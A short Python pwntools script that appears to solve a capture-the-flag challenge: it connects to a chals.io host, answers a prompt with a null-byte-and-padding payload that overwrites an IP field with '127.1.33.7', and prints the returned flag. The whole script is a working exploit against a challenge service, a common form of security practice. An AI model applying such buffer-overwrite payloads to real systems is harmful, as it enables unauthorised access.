from pwn import *

def main():
    r = remote('0.cloud.chals.io', 24939)

    while (True):
        line = str(r.recvline())
        print(line)

        if "Do you want" in line:
            payload = b"YES" + b'\x00' + b"A" *6 + b'127.1.33.7' + b'\x00'
            r.sendline(payload)
            
        if ("Server response" in line):
            flag = str(r.recvline())
            print(flag)
            break


main()
